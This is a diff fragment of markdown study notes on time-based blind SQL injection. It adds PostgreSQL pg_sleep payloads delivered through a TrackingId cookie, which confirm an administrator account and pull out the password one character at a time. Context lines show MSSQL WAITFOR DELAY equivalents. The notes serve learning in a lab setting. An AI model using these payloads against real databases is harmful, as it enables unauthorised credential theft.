@@ -84,9 +84,21 @@
   >`'; IF (1=1) WAITFOR DELAY '0:0:10'--` -> condition true => 10 sec delay
   >=> **retrive data using one character at a time**: `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
 
-/gitcomm
-- another example
-  >  
+let's say we have a *cookie* called `TrackingId` and the *database is PostgreSQL* .
+
+- *example of time delays:*
+  > `TrackingId=x'||pg_sleep(10)--` -> 10 sec delay
+
+- *time delays and information retrieval*:
+> 1) **10 sec conditional delay**: 
+> - `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` -> true => delay
+> - `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` -> false => no delay
+> 2) **confirm `administrator` user**: `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+> 3) **determine the length of the password**(use intruder/repeater): `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>§1§)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+> 4) **extract the password**(use intruder/repeater): 
+> - **first character**: `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+> - **2nd**: `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+> - and so on ...
 # Subverting application logic
 
 ## simple attack 
